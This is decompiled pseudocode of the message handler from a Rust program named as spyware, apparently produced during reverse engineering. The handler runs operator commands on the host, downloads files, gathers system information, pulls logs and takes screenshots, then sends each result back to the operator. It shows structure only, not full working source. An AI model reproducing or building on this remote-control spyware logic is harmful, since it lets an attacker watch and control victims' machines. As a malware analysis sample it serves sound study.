__int64 __fastcall spyware::communication::server::handle_message(__int64 a1, char **a2, __int64 a3, __int64 a4)
{
  __int128 v4; // xmm0
  __int64 v5; // rax
  __int64 result; // rax
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v9; // r8
  __int64 v10; // r9
  char v11; // bp
  unsigned __int64 v12; // r15
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  __int128 v16; // [rsp+0h] [rbp-338h] BYREF
  __int64 v17; // [rsp+10h] [rbp-328h]
  __int128 v18; // [rsp+18h] [rbp-320h]
  _QWORD v19[5]; // [rsp+38h] [rbp-300h] BYREF
  __int128 v20; // [rsp+60h] [rbp-2D8h] BYREF
  __int64 v21; // [rsp+70h] [rbp-2C8h]
  _OWORD v22[2]; // [rsp+80h] [rbp-2B8h] BYREF
  unsigned __int64 v23; // [rsp+A0h] [rbp-298h] BYREF
  __int128 v24; // [rsp+A8h] [rbp-290h]
  __int128 v25; // [rsp+B8h] [rbp-280h]
  __int128 v26; // [rsp+C8h] [rbp-270h]
  __int64 v27; // [rsp+D8h] [rbp-260h]
  unsigned __int64 v28; // [rsp+E0h] [rbp-258h] BYREF
  __int128 v29; // [rsp+E8h] [rbp-250h]
  __int128 v30; // [rsp+F8h] [rbp-240h]
  __int128 v31; // [rsp+108h] [rbp-230h]
  __int64 v32; // [rsp+118h] [rbp-220h]
  unsigned __int64 v33; // [rsp+120h] [rbp-218h] BYREF
  __int128 v34; // [rsp+128h] [rbp-210h]
  __int128 v35; // [rsp+138h] [rbp-200h]
  __int128 v36; // [rsp+148h] [rbp-1F0h]
  __int64 v37; // [rsp+158h] [rbp-1E0h]
  unsigned __int64 v38; // [rsp+160h] [rbp-1D8h] BYREF
  __int128 v39; // [rsp+168h] [rbp-1D0h]
  __int128 v40; // [rsp+178h] [rbp-1C0h]
  __int128 v41; // [rsp+188h] [rbp-1B0h]
  __int64 v42; // [rsp+198h] [rbp-1A0h]
  _OWORD v43[3]; // [rsp+1A0h] [rbp-198h] BYREF
  __int64 v44; // [rsp+1D0h] [rbp-168h]
  _OWORD v45[3]; // [rsp+1D8h] [rbp-160h] BYREF
  __int64 v46; // [rsp+208h] [rbp-130h]
  _OWORD v47[3]; // [rsp+210h] [rbp-128h] BYREF
  __int64 v48; // [rsp+240h] [rbp-F8h]
  _OWORD v49[3]; // [rsp+248h] [rbp-F0h] BYREF
  __int64 v50; // [rsp+278h] [rbp-C0h]
  _OWORD v51[4]; // [rsp+280h] [rbp-B8h] BYREF
  _OWORD v52[7]; // [rsp+2C8h] [rbp-70h] BYREF

  switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )
  {
    case 0uLL:
      v4 = *(_OWORD *)(a1 + 8);
      v22[1] = *(_OWORD *)(a1 + 24);
      v22[0] = v4;
      spyware::actions::commands::run_command_message((__int64)v43, (__int64)v22);
      v27 = v44;
      v26 = v43[2];
      v25 = v43[1];
      v24 = v43[0];
      v23 = 0x8000000000000001LL;
      v5 = spyware::communication::server::send_response((__int64)&v23, (__int64)a2);
      a2 = &off_B8B20;
      result = core::result::Result<T,E>::unwrap(v5, &off_B8B20);
      switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )
      {
        case 0uLL:
        case 6uLL:
        case 8uLL:
          return result;
        case 2uLL:
        case 4uLL:
          goto LABEL_17;
        default:
          return core::ptr::drop_in_place<spyware::communication::messages::Message>(
                   a1,
                   a2,
                   v7,
                   v8,
                   v9,
                   v10,
                   v16,
                   *((_QWORD *)&v16 + 1),
                   v17,
                   v18,
                   *((_QWORD *)&v18 + 1));
      }
      return result;
    case 2uLL:
      v21 = *(_QWORD *)(a1 + 24);
      v20 = *(_OWORD *)(a1 + 8);
      spyware::actions::basic_info::download_file_message((__int64)v45, (__int64)&v20);
      v32 = v46;
      v31 = v45[2];
      v30 = v45[1];
      v29 = v45[0];
      v28 = 0x8000000000000003LL;
      v14 = spyware::communication::server::send_response((__int64)&v28, (__int64)a2);
      a2 = &off_B8B38;
      result = core::result::Result<T,E>::unwrap(v14, &off_B8B38);
      switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )
      {
        case 0uLL:
          return core::ptr::drop_in_place<spyware::communication::messages::ErrorInfo>(
                   a1 + 8,
                   a2,
                   v7,
                   v8,
                   v9,
                   v10,
                   v16,
                   *((_QWORD *)&v16 + 1),
                   v17,
                   v18,
                   *((_QWORD *)&v18 + 1));
        case 2uLL:
        case 6uLL:
        case 8uLL:
          return result;
        case 4uLL:
          goto LABEL_17;
        default:
          return core::ptr::drop_in_place<spyware::communication::messages::Message>(
                   a1,
                   a2,
                   v7,
                   v8,
                   v9,
                   v10,
                   v16,
                   *((_QWORD *)&v16 + 1),
                   v17,
                   v18,
                   *((_QWORD *)&v18 + 1));
      }
      return result;
    case 4uLL:
      v17 = *(_QWORD *)(a1 + 24);
      v16 = *(_OWORD *)(a1 + 8);
      spyware::actions::basic_info::get_basic_info_request((__int64)v52);
      v51[3] = v52[3];
      v51[2] = v52[2];
      v51[1] = v52[1];
      v51[0] = v52[0];
      v13 = spyware::communication::server::send_response((__int64)v51, (__int64)a2);
      a2 = &off_B8B50;
      core::result::Result<T,E>::unwrap(v13, &off_B8B50);
      result = core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(&v16);
      v11 = 0;
      v12 = *(_QWORD *)a1 ^ 0x8000000000000000LL;
      if ( v12 <= 8 )
        goto LABEL_13;
      return core::ptr::drop_in_place<spyware::communication::messages::Message>(
               a1,
               a2,
               v7,
               v8,
               v9,
               v10,
               v16,
               *((_QWORD *)&v16 + 1),
               v17,
               v18,
               *((_QWORD *)&v18 + 1));
    case 6uLL:
      spyware::actions::log_actions::get_logs_request((__int64)v47);
      v37 = v48;
      v36 = v47[2];
      v35 = v47[1];
      v34 = v47[0];
      v33 = 0x8000000000000007LL;
      v15 = spyware::communication::server::send_response((__int64)&v33, (__int64)a2);
      a2 = &off_B8B68;
      goto LABEL_12;
    case 8uLL:
      spyware::actions::screenshot_actions::get_screenshot_request((__int64)v49);
      v42 = v50;
      v41 = v49[2];
      v40 = v49[1];
      v39 = v49[0];
      v38 = 0x8000000000000009LL;
      v15 = spyware::communication::server::send_response((__int64)&v38, (__int64)a2);
      a2 = &off_B8B80;
LABEL_12:
      v11 = 1;
      result = core::result::Result<T,E>::unwrap(v15, a2);
      v12 = *(_QWORD *)a1 ^ 0x8000000000000000LL;
      goto LABEL_13;
    default:
      result = core::sync::atomic::atomic_load(a1, a2, a3, a4);
      if ( result )
      {
        *(_QWORD *)&v16 = &off_B8B10;
        *((_QWORD *)&v16 + 1) = 1LL;
        v17 = 8LL;
        v18 = 0LL;
        v19[0] = aSpywareCommuni;
        v19[1] = 30LL;
        v19[2] = aSpywareCommuni;
        v19[3] = 30LL;
        v19[4] = log::__private_api::loc(&off_B8B98);
        a2 = (char **)(&dword_0 + 1);
        result = log::__private_api::log(&v16, 1LL, v19);
      }
      v11 = 1;
      v12 = *(_QWORD *)a1 ^ 0x8000000000000000LL;
      if ( v12 > 8 )
        return core::ptr::drop_in_place<spyware::communication::messages::Message>(
                 a1,
                 a2,
                 v7,
                 v8,
                 v9,
                 v10,
                 v16,
                 *((_QWORD *)&v16 + 1),
                 v17,
                 v18,
                 *((_QWORD *)&v18 + 1));
LABEL_13:
      switch ( v12 )
      {
        case 0uLL:
          return core::ptr::drop_in_place<spyware::communication::messages::ErrorInfo>(
                   a1 + 8,
                   a2,
                   v7,
                   v8,
                   v9,
                   v10,
                   v16,
                   *((_QWORD *)&v16 + 1),
                   v17,
                   v18,
                   *((_QWORD *)&v18 + 1));
        case 2uLL:
          goto LABEL_17;
        case 4uLL:
          if ( v11 )
LABEL_17:
            result = core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(a1 + 8);
          break;
        case 6uLL:
        case 8uLL:
          return result;
        default:
          return core::ptr::drop_in_place<spyware::communication::messages::Message>(
                   a1,
                   a2,
                   v7,
                   v8,
                   v9,
                   v10,
                   v16,
                   *((_QWORD *)&v16 + 1),
                   v17,
                   v18,
                   *((_QWORD *)&v18 + 1));
      }
      return result;
  }
}